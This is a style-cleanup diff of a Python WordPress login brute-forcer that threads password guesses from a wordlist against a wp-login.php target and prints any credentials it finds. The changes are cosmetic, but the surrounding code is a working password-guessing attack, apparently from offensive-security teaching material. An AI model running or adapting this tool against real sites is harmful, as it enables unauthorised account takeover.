@@ -3,13 +3,13 @@ from lxml import etree
 from queue import Queue
 
 import requests
-import sys
 import threading
 import time
 
 SUCCESS = 'Welcome to WordPress!'
 TARGET = 'http://boodelyboo.com/wordpress/wp-login.php'
 WORDLIST = './cain-and-abel.txt'
+
 
 def get_words():
     with open(WORDLIST) as f:
@@ -20,6 +20,7 @@ def get_words():
         words.put(word)
     return words
 
+
 def get_params(content):
     params = dict()
     parser = etree.HTMLParser()
@@ -29,6 +30,7 @@ def get_params(content):
         if name is not None:
             params[name] = elem.get('value', None)
     return params
+
 
 class Bruter:
     def __init__(self, username, url):
@@ -58,10 +60,11 @@ class Bruter:
             resp1 = session.post(self.url, data=params)
             if SUCCESS in resp1.content.decode():
                 self.found = True
-                print(f'\nBruteforcing successful.')
+                print('\nBruteforcing successful.')
                 print('Username is %s' % self.username)
                 print('Password is %s\n' % passwd)
                 print('done: now cleaning up other threads...')
+
 
 if __name__ == '__main__':
     words = get_words()
